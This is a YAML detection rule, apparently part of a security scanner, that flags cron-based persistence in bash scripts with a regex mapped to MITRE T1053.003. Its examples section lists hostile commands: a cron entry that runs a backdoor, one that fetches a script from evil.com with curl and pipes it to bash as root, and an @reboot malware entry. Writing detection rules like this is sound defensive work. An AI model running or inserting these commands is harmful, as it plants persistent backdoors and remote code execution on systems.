# Bash Pattern: Cron Job Persistence
# Detects cron job manipulation for persistence

id: BASH-004
name: Cron Job Persistence
description: |
  Detects creation or modification of cron jobs for persistence. Attackers use
  cron jobs to maintain access and execute malicious code at scheduled intervals.
  This pattern identifies crontab modifications, direct cron file edits, and
  cron directory manipulation.
languages:
  - bash
detection_type: regex
detection_logic: '(?:crontab\s+-[el]|echo.*>>\s*/var/spool/cron|echo.*>>\s*/etc/cron|/etc/cron\.d/)'
severity: Medium
mitre_technique: T1053.003
confidence: 0.85
category: persistence
enabled: true
metadata:
  author: Script Sentinel Team
  created: "2025-11-17"
  updated: "2025-11-17"
  references:
    - "https://attack.mitre.org/techniques/T1053/003/"
    - "https://man7.org/linux/man-pages/man5/crontab.5.html"
  tags:
    - bash
    - cron
    - persistence
    - scheduled-task
  examples:
    - "(crontab -l; echo '*/5 * * * * /tmp/backdoor.sh') | crontab -"
    - "echo '0 * * * * curl http://evil.com/payload.sh | bash' >> /var/spool/cron/root"
    - "echo '@reboot /tmp/malware' > /etc/cron.d/evil"